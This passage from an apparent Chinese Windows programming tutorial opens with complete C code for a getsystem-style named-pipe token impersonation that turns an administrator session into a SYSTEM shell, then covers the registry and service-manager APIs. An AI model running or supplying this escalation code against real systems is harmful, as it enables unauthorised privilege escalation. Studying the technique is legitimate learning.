进程启动服务\nBOOL ServiceStartByProcess()\n&#123;\n    STARTUPINFO si = &#123; 0 &#125;;\n    PROCESS_INFORMATION pi = &#123; 0 &#125;;\n    si.cb = sizeof(si);\n    // 隐藏窗口\n    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\n    si.wShowWindow = SW_HIDE;\n\n    // 创建服务名为pipe并启动\n    // 简单又猥琐的方法\n    TCHAR cmd[] = &quot;cmd /c sc create pipe BinPath= \\&quot;C:\\\\Windows\\\\System32\\\\cmd.exe /c echo hacker &gt; \\\\\\\\.\\\\pipe\\\\elevate\\&quot; DisplayName= \\&quot;pipe\\&quot; &amp;&amp; sc start pipe&quot;;\n    if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        return FALSE;\n    &#125;\n\n\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n\n    return TRUE;\n&#125;\n\n// 服务线程\nDWORD WINAPI ServiceThread(LPVOID lpParam)\n&#123;\n    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\n    if (!hSCM) return FALSE;\n\n    char cmd[] = &quot;C:\\\\Windows\\\\System32\\\\cmd.exe /c echo hacker &gt; \\\\\\\\.\\\\pipe\\\\elevate&quot;;\n    SC_HANDLE hService = CreateService(hSCM, &quot;pipe&quot;, &quot;pipe&quot;, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, cmd, NULL, NULL, NULL, NULL, NULL);\n    if (!hService) return FALSE;\n\n    if (!StartService(hService, 0, NULL)) return FALSE;\n\n    return TRUE;\n&#125;\n\n// 线程启动服务\nBOOL ServiceStartByThread()\n&#123;\n    HANDLE hThread = CreateThread(NULL, 0, ServiceThread, NULL, 0, NULL);\n    if (!hThread) return FALSE;\n\n    CloseHandle(hThread);\n    return TRUE;\n&#125;\n</code></pre>\n<p>　　使用代码示例</p>\n<pre><code class=\"c\">// 线程启动服务\nif (!ServiceStartByThread())\n&#123;\n    printf(&quot;[-] Start Service Fail\\n&quot;);\n    return 0;\n&#125;\n\n// 进程启动服务\n/*if (!ServiceStartByProcess())\n&#123;\n    printf(&quot;[-] Start Service Fail\\n&quot;);\n    return 0;\n&#125;*/\n\nprintf(&quot;[+] Waiting for pipe connection...\\n&quot;);\n// 等待客户端连接\nConnectNamedPipe(hPipe, NULL);\n</code></pre>\n<p>　　查看msf的getsystem源码，发现它不仅使用了函数，也调用了函数</p>\n<pre><code class=\"c\">BOOL CreateProcessAsUser(\n    HANDLE                hToken,\t\t\t\t// 主令牌句柄\n    LPCSTR                lpApplicationName,\t// 文件名\n    LPSTR                 lpCommandLine,\t\t// 命令行参数\n    LPSECURITY_ATTRIBUTES lpProcessAttributes,\t// 指向进程安全属性的指针\n    LPSECURITY_ATTRIBUTES lpThreadAttributes,\t// 指向线程安全属性的指针\n    BOOL                  bInheritHandles,\t\t// 是否可继承句柄\n    DWORD                 dwCreationFlags,\t\t// 创建标志\n    LPVOID                lpEnvironment,\t\t// 指向新环境块的指针\n    LPCSTR                lpCurrentDirectory,\t// 指向当前目录名的指针\n    LPSTARTUPINFOA        lpStartupInfo,\t\t// 指向 STARTUPINFO 的指针\n    LPPROCESS_INFORMATION lpProcessInformation\t// 指向 PROCESS_INFORMATION 的指针\n);\n</code></pre>\n<p>　　查了查区别，网上说的是:和 函数类似于。好吧也就暂时不纠结了，到后面懂了的时候再来补充</p>\n<p>　　完整代码</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;ShlObj_core.h&gt;\n\n#define PIPENAME &quot;\\\\\\\\.\\\\pipe\\\\elevate&quot;\n\n\n// 进程启动服务\nBOOL ServiceStartByProcess()\n&#123;\n    STARTUPINFO si = &#123; 0 &#125;;\n    PROCESS_INFORMATION pi = &#123; 0 &#125;;\n    si.cb = sizeof(si);\n    // 隐藏窗口\n    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\n    si.wShowWindow = SW_HIDE;\n\n    // 创建服务名为pipe并启动\n    // 简单又猥琐的方法\n    TCHAR cmd[] = &quot;cmd /c sc create pipe BinPath= \\&quot;C:\\\\Windows\\\\System32\\\\cmd.exe /c echo hacker &gt; \\\\\\\\.\\\\pipe\\\\elevate\\&quot; DisplayName= \\&quot;pipe\\&quot; &amp;&amp; sc start pipe&quot;;\n    if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    &#123;\n        return FALSE;\n    &#125;\n\n\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n\n    return TRUE;\n&#125;\n\n// 服务线程\nDWORD WINAPI ServiceThread(LPVOID lpParam)\n&#123;\n    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\n    if (!hSCM) return FALSE;\n\n    char cmd[] = &quot;C:\\\\Windows\\\\System32\\\\cmd.exe /c echo hacker &gt; \\\\\\\\.\\\\pipe\\\\elevate&quot;;\n    SC_HANDLE hService = CreateService(hSCM, &quot;pipe&quot;, &quot;pipe&quot;, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, cmd, NULL, NULL, NULL, NULL, NULL);\n    if (!hService) return FALSE;\n\n    if (!StartService(hService, 0, NULL)) return FALSE;\n\n    return TRUE;\n&#125;\n\n// 线程启动服务\nBOOL ServiceStartByThread()\n&#123;\n    HANDLE hThread = CreateThread(NULL, 0, ServiceThread, NULL, 0, NULL);\n    if (!hThread) return FALSE;\n\n    CloseHandle(hThread);\n    return TRUE;\n&#125;\n\n// 删除服务\nvoid ServiceDelete()\n&#123;\n    // 也可以使用system(&quot;sc delete pipe&quot;); 来删除服务\n    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\n    if (!hSCM) return;\n\n    // 删除服务名为pipe\n    SC_HANDLE hServ = OpenService(hSCM, &quot;pipe&quot;, SERVICE_ALL_ACCESS);\n    if (!hServ) return;\n\n    if (!DeleteService(hServ)) return;\n\n    printf(&quot;[+] Delete service sucess\\n&quot;);\n&#125;\n\nint main()\n&#123;\n    // 没有管理员权限\n    if (!IsUserAnAdmin())\n    &#123;\n        printf(&quot;[-] User Not An Admin\\n&quot;);\n        return 0;\n    &#125;\n\n    // 创建命名管道\n    HANDLE hPipe = CreateNamedPipe(\n        PIPENAME,\n        PIPE_ACCESS_DUPLEX,\n        PIPE_TYPE_MESSAGE | PIPE_WAIT,\n        PIPE_UNLIMITED_INSTANCES,\n        0, 0, 0, NULL\n    );\n\n    if (!hPipe)\n    &#123;\n        printf(&quot;[-] Create Named Pipe Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Create Named Pipe %s\\n&quot;, PIPENAME);\n\n\n    // 线程启动服务\n    if (!ServiceStartByThread())\n    &#123;\n        printf(&quot;[-] Start Service Fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 进程启动服务\n    /*if (!ServiceStartByProcess())\n    &#123;\n        printf(&quot;[-] Start Service Fail\\n&quot;);\n        return 0;\n    &#125;*/\n\n    printf(&quot;[+] Waiting for pipe connection...\\n&quot;);\n    // 等待客户端连接\n    ConnectNamedPipe(hPipe, NULL);\n\n    // 接收客户端数据 \n    // 注意要提权成功,必须要接收数据,具体原因不知\n    char buffer[256] = &#123; 0 &#125;;\n    ZeroMemory(buffer, sizeof(buffer));\n\n    if (!ReadFile(hPipe, buffer, sizeof(buffer), 0, NULL))\n    &#123;\n        printf(&quot;[-] Disconnect Named Pipe\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] RecvData is %s&quot;, buffer);\n\n    // 获取令牌\t\n    BOOL ret = ImpersonateNamedPipeClient(hPipe);\n    // 不再需要服务了\n    ServiceDelete();\n\n    // 获取令牌失败\n    if (!ret)\n    &#123;\n        printf(&quot;[-] Impersonate Client Fail\\n&quot;);\n        return 0;\n    &#125;\n\n    printf(&quot;[+] Impersonate Client Sucess\\n&quot;);\n\n    HANDLE token;\n    // 获取线程令牌\n\n    ret = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token);\n    if (!ret)\n    &#123;\n        printf(&quot;[!] Open Thread Token Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Open Thread Token Sucess\\n&quot;);\n\n    HANDLE hNewToken;\n    // 将线程令牌转换成进程令牌\n    ret = DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &amp;hNewToken);\n    if (!ret)\n    &#123;\n        printf(&quot;[!] Duplicate Token Fail\\n&quot;);\n        return 0;\n    &#125;\n    printf(&quot;[+] Duplicate Token Sucess\\n&quot;);\n\n    STARTUPINFO si = &#123; 0 &#125;;\n    PROCESS_INFORMATION pi = &#123; 0 &#125;;\n    si.cb = sizeof(si);\n\n    do\n    &#123;\n        ret = CreateProcessAsUser(hNewToken, NULL, &quot;\\&quot;cmd.exe\\&quot;&quot;, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);\n        if (ret) break;\n\n        ret = CreateProcessWithTokenW(hNewToken, 0, L&quot;cmd.exe&quot;, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi);\n        if (ret) break;\n\n        printf(&quot;[!] Get System Fail\\n&quot;);\n        return 0;\n\n    &#125; while (0);\n\n    printf(&quot;[+] Get System Sucess\\n&quot;);\n\n    DisconnectNamedPipe(hPipe);\n    CloseHandle(hPipe);\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n    CloseHandle(hNewToken);\n    CloseHandle(token);\n    return 0;\n&#125;\n</code></pre>\n<h3 id=\"注册表\"><a href=\"#注册表\" class=\"headerlink\" title=\"注册表\"></a>注册表</h3><p>　　注册表是Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。</p>\n<p>　　注册表由主键、子键、键值构造，主键就是根，有以下主键</p>\n<p>　　<strong>HKEY_CLASSES_ROOT</strong>、<strong>HKEY_CURRENT_CONFIG</strong> 、<strong>HKEY_CURRENT_USER</strong>、<strong>HKEY_LOCAL_MACHINE</strong> 、<strong>HKEY_USERS</strong></p>\n<p>　　而子键就是主键下的键，类似于文件夹的结构，例如<code>HKEY_LOCAL_MACHINE\\SOFTWARE</code>，<code>SOFTWARE</code>就是子键。</p>\n<p>　　键值是子键下的具体内容，由名称、类型、数据组成</p>\n<h4 id=\"子键\"><a href=\"#子键\" class=\"headerlink\" title=\"子键\"></a>子键</h4><h5 id=\"打开\"><a href=\"#打开\" class=\"headerlink\" title=\"打开\"></a>打开</h5><p>　　打开注册表有两个api:<code>RegOpenKey</code>和<code>RegOpenKeyEx</code>。微软推荐使用后缀带<code>Ex</code>的api，因为<code>RegOpenKey</code>是以前16位机用的，<code>Ex</code>版本更灵活和强大。</p>\n<pre><code class=\"c\">LSTATUS RegOpenKeyEx(\n    HKEY   hKey,\t\t// 注册表句柄 或 主键\n    LPCSTR lpSubKey,\t// 注册表子键\n    DWORD  ulOptions,\t// 保留 必须是0\n    REGSAM samDesired,\t// 访问权限\n    PHKEY  phkResult\t// 返回打开的注册表句柄\n);\t\t\t\t\t\t// 成功返回 ERROR_SUCCESS 失败返回 非0错误码\n</code></pre>\n<p>　　<code>samDesired</code>访问权限，这里列出常用的值，</p>\n<pre><code class=\"none\">KEY_ALL_ACCESS\t\t\t\t// 获取所有权限\nKEY_CREATE_SUB_KEY\t\t\t// 创建子键\nKEY_ENUMERATE_SUB_KEYS\t\t// 枚举子键\nKEY_EXECUTE\t\t\t\t\t// 允许读操作\nKEY_QUERY_VALUE\t\t\t\t// 查询子键\nKEY_READ\t\t\t\t\t// STANDARD_RIGHTS_READ、KEY_QUERY_VALUE、KEY_ENUMERATE_SUB_KEYS、KEY_NOTIFY值的组合\nKEY_SET_VALUE\t\t\t\t// 创建、删除或设置子键\nKEY_WRITE\t\t\t\t\t// STANDARD_RIGHTS_WRITE、KEY_SET_VALUE、KEY_CREATE_SUB_KEY值的组合\nKEY_WOW64_32KEY \t\t\t// 访问32位注册表\nKEY_WOW64_64KEY\t\t\t\t// 访问64位注册表\n</code></pre>\n<p>　　关于和，我建议你单独去了解了解。有些时候创建成功或者打开失败，都有可能和这个有关。</p>\n<p>　　关闭注册表句柄使用<code>RegCloseKey</code>函数</p>\n<p>　　例子，注意键名不区分大小写</p>\n<pre><code class=\"c\">HKEY hKey;\n// 键名不区分大小写\n// 打开HKEY_LOCAL_MACHINE\\SOFTWARE\nlong ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SoFTwARE&quot;, 0, KEY_ALL_ACCESS, &amp;hKey);\nif (ret == ERROR_SUCCESS)\n&#123;\n    printf(&quot;open key success\\n&quot;);\n    RegCloseKey(hKey);\n&#125;\n</code></pre>\n<h5 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h5><p>　　<code>RegCreateKeyEx</code>，创建指定的注册表项。如果键已经存在，函数将打开它</p>\n<pre><code class=\"c\">LSTATUS RegCreateKeyEx(\n    HKEY                        hKey,\t\t\t\t// 注册表句柄 或 主键\n    LPCSTR                      lpSubKey,\t\t\t// 创建子键的名称\n    DWORD                       Reserved,\t\t\t// 保留 必须为0\n    LPSTR                       lpClass,\t\t\t// 忽略 填NULL\n    DWORD                       dwOptions,\t\t\t// 填0 具体参考msdn\n    REGSAM                      samDesired,\t\t\t// 访问权限\n    LPSECURITY_ATTRIBUTES lpSecurityAttributes,\t\t// 指向SECURITY_ATTRIBUTES结构的指针\n    PHKEY                       phkResult,\t\t\t// 返回打开或创建注册表句柄\n    LPDWORD                     lpdwDisposition\t\t// 接收处理后的结果 可以置NULL\n);\t\t\t\t\t\t\t\t\t\t\t\t\t// 成功返回 ERROR_SUCCESS 失败返回 非0错误码\n</code></pre>\n<p>　　<code>lpdwDisposition</code> 有以下值</p>\n<pre><code class=\"none\">REG_CREATED_NEW_KEY \t\t// 不存在子键则创建\nREG_OPENED_EXISTING_KEY\t\t// 子键已经存在则打开\n</code></pre>\n<p>　　这里演示两种创建子键的方法，一种是基于已经打开的注册表句柄创建，一种是直接创建</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\n// 基于打开的注册表句柄创建\nvoid method1()\n&#123;\n    HKEY hKey;\n\n    long ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOftWAre&quot;, 0, KEY_ALL_ACCESS, &amp;hKey);\n    if (ret != ERROR_SUCCESS)\n        return 0;\n\n    printf(&quot;open key success\\n&quot;);\n\n    DWORD result = 0;\n    \n    // 可一次性创建多级子键\n    // 创建HKEY_LOCAL_MACHINE\\SOFTWARE\\aaa\\b\\c\\d\n    ret = RegCreateKeyEx(hKey, L&quot;aaa\\\\b\\\\c\\\\d&quot;, 0, NULL, 0, KEY_CREATE_SUB_KEY, NULL, &amp;hKey, &amp;result);\n    if (ret != ERROR_SUCCESS)\n        return 0;\n\n    // 成功创建子键\n    if (result == REG_CREATED_NEW_KEY)\n    &#123;\n        printf(&quot;create new key\\n&quot;);\n    &#125;\n\n    // 子键已经存在\n    if (result == REG_OPENED_EXISTING_KEY)\n    &#123;\n        printf(&quot;key is existing\\n&quot;);\n    &#125;\n\n    RegCloseKey(hKey);\n&#125;\n\n// 直接创建子键\nvoid method2()\n&#123;\n    HKEY hKey;\n    // 创建HKEY_LOCAL_MACHINE\\SOFTWARE\\aaa\\b\\c\\d\n    long ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\aaa\\\\b\\\\c\\\\d&quot;, 0, NULL, 0, KEY_CREATE_SUB_KEY, NULL, &amp;hKey, NULL);\n    if (ret == ERROR_SUCCESS)\n    &#123;\n        printf(&quot;RegCreateKeyEx success\\n&quot;);;\n        RegCloseKey(hKey);\n    &#125;\n&#125;\n\nint main() \n&#123;\n    // 直接创建子键\n    method2();\n    // 基于打开的注册表句柄创建\n    method1();\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">RegCreateKeyEx success\nopen key success\nkey is existing\n</code></pre>\n<h5 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h5><p>　　<code>RegDeleteKeyEx</code>，只能删除一个非空子键</p>\n<pre><code class=\"c\">LSTATUS RegDeleteKeyEx(\n    HKEY   hKey,\t\t\t// 注册表句柄 或 主键\n    LPCSTR lpSubKey,\t\t// 要删除的子键\n    REGSAM samDesired,\t\t// 访问掩码\n    DWORD  Reserved\t\t\t// 保留置0\n);\t\t\t\t\t\t\t// 成功返回 ERROR_SUCCESS 失败返回 非0错误码\n</code></pre>\n<p><code>samDesired</code></p>\n<pre><code class=\"none\">KEY_WOW64_32KEY\t\t从 32 位注册表中删除该项\nKEY_WOW64_64KEY\t\t从 64 位注册表中删除该项\n</code></pre>\n<p>　　示例</p>\n<pre><code class=\"c\">// 删除HKEY_LOCAL_MACHINE\\SOFTWARE\\aaa\\b\\c\\d\nlong ret = RegDeleteKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\aaa\\\\b\\\\c\\\\d&quot;, KEY_WOW64_64KEY, 0);\nif (ret == ERROR_SUCCESS)\n    printf(&quot;delete key success\\n&quot;);\n</code></pre>\n<p>　　如果要递归删除，用<code>RegDeleteTree</code><br>　　示例</p>\n<pre><code class=\"c\">// 删除HKEY_LOCAL_MACHINE\\SOFTWARE\\aaa 以及aaa下的所有子键\nRegDeleteTree(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\aaa&quot;);\n</code></pre>\n<h4 id=\"键值\"><a href=\"#键值\" class=\"headerlink\" title=\"键值\"></a>键值</h4><h5 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h5><p>　　获取键值中的某个值的数据，可以使用<code>RegQueryValueEx</code></p>\n<pre><code class=\"c\">LSTATUS RegQueryValueEx(\n    HKEY    hKey,\t\t\t// 注册表句柄 或 主键\n    LPCSTR  lpValueName,\t// 键值名称\n    LPDWORD lpReserved,\t\t// 保留置NULL\n    LPDWORD lpType,\t\t\t// 键值类型 可置NULL\n    LPBYTE  lpData,\t\t\t// 接收数据缓冲区指针 可置NULL\n    LPDWORD lpcbData\t\t// 缓冲区指针大小\n);\t\t\t\t\t\t\t// 成功返回 ERROR_SUCCESS 失败返回 非0错误码\n</code></pre>\n<p>　　当<code>lpData</code>为NULL时，<code>lpcbData</code>返回实际获取到的缓冲区大小<br>　　示例</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint main() \n&#123;\n    HKEY hKey;\n    TCHAR subKey[] = TEXT(&quot;HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0&quot;);\n    long ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &amp;hKey);\n    if (ret != ERROR_SUCCESS)\n    &#123;\n        printf(&quot;RegOpenKeyEx fail\\n&quot;);\n        return 0;\n    &#125;\n       \n    DWORD size = 0;\n    DWORD type = 0;\n    // 第一次获取缓冲区大小\n    ret = RegQueryValueEx(hKey, L&quot;ProcessorNameString&quot;, NULL, &amp;type, NULL, &amp;size);\n    if (ret != ERROR_SUCCESS)\n        return 0;\n    \n    if (type == REG_SZ)\n        printf(&quot;type is string\\n&quot;);\n\n    // 动态分配空间\n    TCHAR* data = (TCHAR*)malloc(sizeof(TCHAR) * size + 5);\n\n    ret = RegQueryValueEx(hKey, L&quot;ProcessorNameString&quot;, NULL, NULL, data, &amp;size);\n    if (ret != ERROR_SUCCESS)\n        return 0;\n\n    wprintf(L&quot;cpu is %s\\n&quot;, data);\n    free(data);\n    RegCloseKey(hKey);\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">type is string\ncpu is AMD Ryzen 5 2600 Six-Core Processor\n</code></pre>\n<h5 id=\"增加-amp-修改\"><a href=\"#增加-amp-修改\" class=\"headerlink\" title=\"增加&amp;修改\"></a>增加&amp;修改</h5><p>　　<code>RegSetValueEx</code>，可以修改键值的值，如果此键值不存在，则<strong>创建</strong>此键值</p>\n<pre><code class=\"c\">LSTATUS RegSetValueEx(\n    HKEY       hKey,\t\t\t// 注册表句柄\n    LPCSTR     lpValueName,\t\t// 键值名称\n    DWORD      Reserved,\t\t// 保留必须是0\n    DWORD      dwType,\t\t\t// 键值类型\n    const BYTE *lpData,\t\t\t// 写入的缓冲区指针\n    DWORD      cbData\t\t\t// 缓冲区大小\n);\t\t\t\t\t\t\t\t// 成功返回 ERROR_SUCCESS 失败返回 非0错误码\n</code></pre>\n<p>　　经测试，使用，写入的数据才不会乱码　　示例</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint main() \n&#123;\n    // 创建HKEY_LOCAL_MACHINE\\SOFTWARE\\aaa 子键\n    HKEY hKey;\n    long ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\aaa&quot;, 0, NULL, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &amp;hKey, NULL);\n    if (ret != ERROR_SUCCESS)\n    &#123;\n        printf(&quot;RegCreateKeyEx fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 创建test键值 内容为this is demo 这是个示例\n    BYTE data[] = &quot;this is demo 这是个示例&quot;;\n    ret = RegSetValueExA(hKey, &quot;test&quot;, 0, REG_SZ, (BYTE*)data, sizeof(data));\n    if (ret == ERROR_SUCCESS)\n        printf(&quot;sucess\\n&quot;);\n\n    RegCloseKey(hKey);\n    return 0;\n&#125;\n</code></pre>\n<h5 id=\"删除-1\"><a href=\"#删除-1\" class=\"headerlink\" title=\"删除\"></a>删除</h5><p>　　删除键值非常简单，只需要调用<code>RegDeleteValue</code><br>　　示例</p>\n<pre><code class=\"c\">// 创建HKEY_LOCAL_MACHINE\\SOFTWARE\\aaa 子键\nHKEY hKey;\nRegCreateKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\aaa&quot;, 0, NULL, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &amp;hKey, NULL);\n\n// 创建test键值\nBYTE data[] = &quot;this is demo 这是个示例&quot;;\nRegSetValueExA(hKey, &quot;test&quot;, 0, REG_SZ, (BYTE*)data, sizeof(data));\n\n// 删除test键值\nRegDeleteValue(hKey, L&quot;test&quot;);\nRegCloseKey(hKey);\n</code></pre>\n<h5 id=\"枚举\"><a href=\"#枚举\" class=\"headerlink\" title=\"枚举\"></a>枚举</h5><p>　　获取子键下的所有数据需要两个api，第一个<code>RegQueryInfoKey</code>，获取注册表项的相关信息</p>\n<pre><code class=\"c\">LSTATUS RegQueryInfoKey(\n    HKEY      hKey,\t\t\t\t\t\t// 注册表句柄\n    LPSTR     lpClass,\t\t\t\t\t// 可为NULL\n     LPDWORD   lpcchClass,\t\t\t\t// 可为NULL\n    LPDWORD   lpReserved,\t\t\t\t// 必须为NULL\n    LPDWORD   lpcSubKeys,\t\t\t\t// 子键数量 可为NULL\n    LPDWORD   lpcbMaxSubKeyLen,\t\t\t// 可为NULL\n    LPDWORD   lpcbMaxClassLen,\t\t\t// 可为NULL\n    LPDWORD   lpcValues,\t\t\t\t// 键值数量 可为NULL\n    LPDWORD   lpcbMaxValueNameLen,\t\t// 键名最大大小 可为NULL\n    LPDWORD   lpcbMaxValueLen,\t\t\t// 键值最大大小 可为NULL\n    LPDWORD   lpcbSecurityDescriptor,\t// 可为NULL\n    PFILETIME lpftLastWriteTime\t\t\t// 可为NULL\n);\t\t\t\t\t\t\t\t\t\t// 成功返回 ERROR_SUCCESS 失败返回 非0错误码\n</code></pre>\n<p>　　第二个，枚举键值信息</p>\n<pre><code class=\"c\">LSTATUS RegEnumValueA(\n    HKEY    hKey,\t\t\t\t// 注册表句柄\n    DWORD   dwIndex,\t\t\t// 索引\n    LPSTR   lpValueName,\t\t// 键名缓冲区指针\n    LPDWORD lpcchValueName,\t\t// 键名缓冲区大小\n    LPDWORD lpReserved,\t\t\t// 保留 必须为NULL\n    LPDWORD lpType,\t\t\t\t// 键值类型 可为NULL\n    LPBYTE  lpData,\t\t\t\t// 键值缓冲区指针 可为NULL\n    LPDWORD lpcbData\t\t\t// 键值缓冲区大小 可为NULL\n);\t\t\t\t\t\t\t\t// 成功返回 ERROR_SUCCESS 失败返回 非0错误码\n</code></pre>\n<p>　　示例</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint main() \n&#123;\n    HKEY hKey;\n    TCHAR subKey[] = TEXT(&quot;HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0&quot;);\n    RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &amp;hKey);\n\n    DWORD cnt, maxNameLen, maxValueLen;\n    // 查询键值信息\n    RegQueryInfoKey(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &amp;cnt, &amp;maxNameLen, &amp;maxValueLen, NULL, NULL);\n    printf(&quot;一共有%d个键\\n最大键名:%d个字符\\n最大键值:%d个字符\\n&quot;, cnt, maxNameLen, maxValueLen);\n\n    TCHAR* name = (TCHAR*)malloc(sizeof(TCHAR) * maxNameLen + 5);\n    printf(&quot;\\nHKEY_LOCAL_MACHINE\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0 有以下键名\\n\\n&quot;);\n\n    // 循环遍历\n    for (DWORD i = 0; i &lt; cnt; i++)\n    &#123;\n        ZeroMemory(name, maxNameLen);   // 内存置0\n        // 必须+1 多个&#39;\\0&#39;的空间\n        DWORD nameSize = maxNameLen + 1;\n        RegEnumValue(hKey, i, name, &amp;nameSize, NULL, NULL, NULL, NULL);\n        wprintf(L&quot;%s\\n&quot;, name);\n    &#125;\n    \n    free(name);\n    RegCloseKey(hKey);\n\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">一共有11个键\n最大键名:24个字符\n最大键值:96个字符\n\nHKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 有以下键名\n\nComponent Information\nIdentifier\nConfiguration Data\nProcessorNameString\nVendorIdentifier\nFeatureSet\n~MHz\nUpdate Revision\nUpdate Status\nPrevious Update Revision\nPlatform Specific Field1\n</code></pre>\n<h3 id=\"系统服务\"><a href=\"#系统服务\" class=\"headerlink\" title=\"系统服务\"></a>系统服务</h3><p>　　服务程序是windows上重要的一类程序，它们虽然不与用户进行界面交互，但是它们对于系统有着重要的意义。windows上为了管理服务程序提供了一个特别的程序：服务控制管理程序，系统上关于服务控制管理的API基本上都与这个程序打交道。下面通过对服务程序的操作来说明这些API函数</p>\n<h4 id=\"打开-1\"><a href=\"#打开-1\" class=\"headerlink\" title=\"打开\"></a>打开</h4><p>　　必须先建立一个到服务控制管理器的连接，即打开一个数据库。使用<code>OpenSCManager</code></p>\n<pre><code class=\"c\">SC_HANDLE OpenSCManagerW(\n    LPCWSTR lpMachineName,\t// 主机名 NULL表示本机\n    LPCWSTR lpDatabaseName,\t// 数据库名 设置\n    DWORD   dwDesiredAccess\t// 访问权限 \n);\t\t\t\t\t\t\t// 成功返回 操作数据库句柄 失败返回 NULL\n</code></pre>\n<p><code>dwDesiredAccess</code></p>\n<pre><code class=\"none\">SC_MANAGER_ALL_ACCESS\t\t\t拥有所有权限\nSC_MANAGER_CREATE_SERVICE\t\t创建服务权限\nSC_MANAGER_ENUMERATE_SERVICE\t枚举服务权限\nSERVICE_QUERY_CONFIG \t\t\t查询服务配置权限\nSERVICE_START\t\t\t\t\t启动服务权限\nSERVICE_STOP\t\t\t\t\t停止服务权限\n</code></pre>\n<p>　　关闭服务句柄，使用<code>CloseServiceHandle</code><br>　　示例</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n&#123;\n    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\n    if (!hSCM) return;\n\n    printf(&quot;OpenSCManager sucess&quot;);\n    CloseServiceHandle(hSCM);\n    \n    return 0;\n&#125;\n</code></pre>\n<h4 id=\"枚举-1\"><a href=\"#枚举-1\" class=\"headerlink\" title=\"枚举\"></a>枚举</h4><p>　　枚举系统服务可以使用<code>EnumServicesStatus</code>，或者<code>EnumServicesStatusEx</code></p>\n<pre><code class=\"c\">BOOL EnumServicesStatus(\n    SC_HANDLE              hSCManager,\t\t\t// 数据库句柄\n    DWORD                  dwServiceType,\t\t// 服务类型 SERVICE_WIN32(win32类型服务)\n    DWORD                  dwServiceState,\t\t// 服务状态\n    LPENUM_SERVICE_STATUSW lpServices,\t\t\t// 指向ENUM_SERVICE_STATUS结构体指针\n    DWORD                  cbBufSize,\t\t\t// 结构体缓冲区大小\n    LPDWORD                pcbBytesNeeded,\t\t// 实际需要缓冲区大小\n    LPDWORD                lpServicesReturned,\t// 服务个数\n    LPDWORD                lpResumeHandle\t\t// 